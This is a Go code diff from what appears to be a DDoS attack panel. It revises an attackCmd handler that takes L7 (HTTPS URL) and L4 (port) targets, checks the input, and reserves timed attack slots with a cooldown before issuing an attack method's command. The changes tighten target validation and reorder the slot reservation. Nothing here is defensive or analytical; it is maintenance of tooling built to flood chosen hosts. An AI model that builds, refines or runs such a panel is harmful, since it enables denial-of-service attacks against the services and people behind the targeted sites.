@@ -378,15 +378,6 @@ func isNum(s string) bool {
 	return true
 }
 
-func hasDigit(s string) bool {
-	for i := 0; i < len(s); i++ {
-		if s[i] >= '0' && s[i] <= '9' {
-			return true
-		}
-	}
-	return false
-}
-
 func isIPish(s string) bool {
 	hasDot := false
 	for i := 0; i < len(s); i++ {
@@ -429,29 +420,14 @@ func attackCmd(m method) func(s *Session, args []string) bool {
 			return false
 		}
 
-		if len(s.slots) > 0 {
-			now := time.Now()
-			free := -1
-			for i, release := range s.slots {
-				if release.IsZero() || now.After(release) {
-					free = i
-					break
-				}
-			}
-			if free == -1 {
-				s.print("no free slots, wait for one to clear")
-				return false
-			}
-			s.slots[free] = now.Add(time.Duration(durVal+s.cooldown) * time.Second)
-		}
-
 		if layer == "L7" {
 			if !strings.HasPrefix(host, "https://") {
 				s.print(example)
 				return false
 			}
 			rest := strings.TrimPrefix(host, "https://")
-			if rest == "" || hasDigit(rest) {
+			domain := strings.SplitN(rest, "/", 2)[0]
+			if rest == "" || isIPish(domain) || strings.ContainsAny(rest, " \t") {
 				s.print(example)
 				return false
 			}
@@ -468,6 +444,22 @@ func attackCmd(m method) func(s *Session, args []string) bool {
 				s.print("L4 port must be numeric")
 				return false
 			}
+		}
+
+		if len(s.slots) > 0 {
+			now := time.Now()
+			free := -1
+			for i, release := range s.slots {
+				if release.IsZero() || now.After(release) {
+					free = i
+					break
+				}
+			}
+			if free == -1 {
+				s.print("no free slots, wait for one to clear")
+				return false
+			}
+			s.slots[free] = now.Add(time.Duration(durVal+s.cooldown) * time.Second)
 		}
 
 		cmd := m.Command
